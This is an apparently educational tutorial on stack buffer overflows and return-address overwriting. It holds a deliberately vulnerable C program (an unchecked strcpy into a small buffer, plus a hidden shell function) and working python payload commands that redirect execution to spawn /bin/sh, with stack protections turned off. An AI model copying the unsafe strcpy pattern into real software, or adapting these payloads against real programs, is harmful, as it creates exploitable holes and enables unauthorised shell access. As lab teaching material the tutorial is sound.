# Overwriting the RIP/EIP

sources:
https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html \
https://stackoverflow.com/questions/44938745/rodata-section-loaded-in-executable-page \
https://stackoverflow.com/questions/51919876/retrieving-offsets-strings-and-virtual-address-in-rodata-and-rodata1 
https://stackoverflow.com/questions/1685483/how-can-i-examine-contents-of-a-data-section-of-an-elf-file-on-linux

When a function is called, a return address is saved in the stack so the
program knows where to take instructions from after the function exits, by
loading this address to the Instruction Pointer.

With `first_buffer_overflow.c` we learned how to overwrite a variable below
the buffer to get access to a part of the program, but if we can overwrite
the RIP (or EIP) we will be able to go to any part of the program
after a function is called.

Overwriting the RIP to redirect the execution flow of the program is the
key concept in Return-Oriented Programming (ROP).

Our "victim" will be the program at `rip.c`:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void impossible_shell(){

	system("/bin/sh");
}

int password_is_correct(char* passwd){

	char buffer[16];
	strcpy(buffer, passwd);

	return !strncmp(buffer, "passwd1", 16);
}

int main(int argc, char* argv[]){

	if( password_is_correct(argv[1]) ){

		printf("PASSWORD IS CORRECT!\n");
		printf("i don't feel like giving you a shell though😝\n");

	} else {

		printf("PASSWORD IS INCORRECT!\n");
		printf("try harder next time\n");
	}
}

```

It is important to note some stuff about the program:

* The function *impossible_shell* is **never** called by the program.
We are going to call it anyway :wink:

* The input is given directly from the command line. If scanf was used
the only difference is that we would use some command line trick to
redirect the desired input to the program. The concepts used for the actual
ROP wouldn't change.

## The Compilation

Just like in `first_buffer_overflow.c`, we will compile with some flags
to allow us to exploit the program easily. We will introduce some new
flags and gradually compile without some of them as we understand how
to bypass the defenses they disable.

## Easiest Cenario

### The Compilation

We will compile using
`gcc rip.c -m32 -no-pie -fno-stack-protector -o rip`:

* `-m32` - compile to 32 bits. The code will still run on 64 bit
architectures. If your compilation throws an error, try installing the
`libc6-dev-i386` package in Linux. 32 bit addresses are smaller and
usually don't contain null bytes, which we can't write to an string.

* `-no-pie` - force to produce position-dependent code. When the code
is position-independent the OS usually puts it in a random location in
memory. We will first execute the program to discover relevant
addresses and then execute again to use them, and without this flag
the addresses would be different between executions.

* `-fno-stack-protector` - disables canary. Canary is a defense technique
against buffer overflow that basically puts a random value in the stack
and check if it changes at some point. If it does is because a buffer
overflow overwrote it and the program is terminated.

* `-o` what comes after this flag will be the name of our executable.

Or you can just use the `Makefile`'s  `first` rule with `make first`.

### Plan of Attack

As stated before, ROP is all about redirecting the flow of execution
by overwriting the return address in the stack. All we need to make
it happen is the address to `impossible_shell` and how far our
buffer is from the return address.

Mind that we are not going to overwrite the return address from `main`,
since the buffer is actually in the `password_is_correct` stack frame.

### Getting r00t

First, launch gdb with `gdb -q rip`. We will use the `info functions`
command in `gdb` to search for `impossible_shell`.

```
info functions impossible_shell
```

Obs .: `info functions` does the search using regex. Just writing
`impossible` would do the job!

You should have an output like this one (the address is probably
different though):

```
All functions matching regular expression "impossible":

Non-debugging symbols:
0x0804849b  impossible_shell
```

We now only need the distance from the buffer to the return address.
To get it, all we really need is to run
`disassemble password_is_correct` to peek under the hood.

We know that our buffer is used as argument for `strcpy` and
`strncmp`,  so we just need to check what address (from the stack)
pushed to the stack before these functions are called.

Indeed, just before `strcpy` is called we have:

```
0x0804852c <+21>:	push   DWORD PTR [ebp+0x8]
0x0804852f <+24>:	lea    eax,[ebp-0x18]
0x08048532 <+27>:	push   eax
```

And just before calling `strncmp`:

```
0x08048540 <+41>:	lea    eax,[ebx-0x1971]
0x08048546 <+47>:	push   eax
0x08048547 <+48>:	lea    eax,[ebp-0x18]
0x0804854a <+51>:	push   eax

```

Obs .: In this case, all the information we just gathered using
`gdb` could be fetched using `objdump -d -M intel-mnemonic rip`.

In both snippets, the common address is **ebp-0x18**. Which means
that after the 18th byte our buffer start writing EBP
(which has 4 bytes) and then our target: EIP (also 4 bytes).

All that is left to do now is write the payload and give it
as the input to the program:

```
./rip `python -c "print(b'A'*0x18 + b'BBBB' + b'\x9b\x84\x04\x08')"`
```
Or, using python3:
```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x9b\x84\x04\x08')"`
```

Here we have 24 (0x18) bytes to fill the space between the EBP
and the start of the buffer, after that we have `'BBBB'` to fill
the EBP, and finally we have the value that will be the new
Return Address.

Obs.: My machine uses little-endian, that's why the address byte
order is backwards. Yours is probably too (most are nowadays)

Running any of the above commands (with the proper addresses)
should grant you a shell!

### Getting Shell in Other Scenarios

Although we managed to get the shell, our methodology could be improved
to work in other scenarios.

* What if `impossible_shell` was a more complex function?

* What if `system` called "/bin/cal" instead?

* What if `system` wasn't called at all?

#### What if: `impossible_shell` was a more complex function

Why are calling `impossible_shell` in the first place? The answer:
to call `system`. However, we could cut the middleman here and go
directly to `system`! For that we can just point EIP directly to
the instruction that calls `system`:

```
80484b8:	e8 a3 fe ff ff       	call   8048360 <system@plt>
```

But doing so yields:

```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08')"`
Segmentation fault
```

Why that didn't work? Well, we may be calling `system` but we aren't
passing any arguments to it! Just like we saw before with the buffer
we are overflowing and the `strcmp` and `strcpy` functions, the
strings taken as argument is pushed to the stack before the function
call.

When we call `impossible_shell` it pushes EBP to the stack ('BBBB') and
then the argument to `system`, "/bin/sh". Since we are going directly
to `system`, we are the ones responsible for the heavy-lifting.

When `password_is_correct` calls `leave` and `ret` at the end of the
excution, it pops 'BBBB' and the address that comes after it. So all
we need to do is add the arguments that will be given to the `system`
call:

```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08' + b'bin/sh address')"`
```

Since "/bin/sh" is a string literal it should be in the `.rodata`
section, destined to readonly data. We can get to which address
this section gets mapped to with `readelf --sections rip`:

```
[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
[16] .rodata           PROGBITS        08048618 000618 00008c 00   A  0   0  4
```

As you can see, in my case the address is `0x08048618`. The "/bin/sh"
should be somewhere inside this section. With `readelf -p .rodata rip`
we can see the contents of the section and their offset from the
start of the section:

```
  [     8]  /bin/sh
  [    10]  passwd1
  [    18]  PASSWORD IS CORRECT!
  [    30]  i don't feel like giving you a shell though�
  [    60]  PASSWORD IS INCORRECT!
  [    77]  try harder next time
```

"/bin/sh" start 8 bytes after `0x08048618`, so `0x08048620` is
the value to put in the payload:

```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08' + b'\x20\x86\x04\x08')"`
$
```


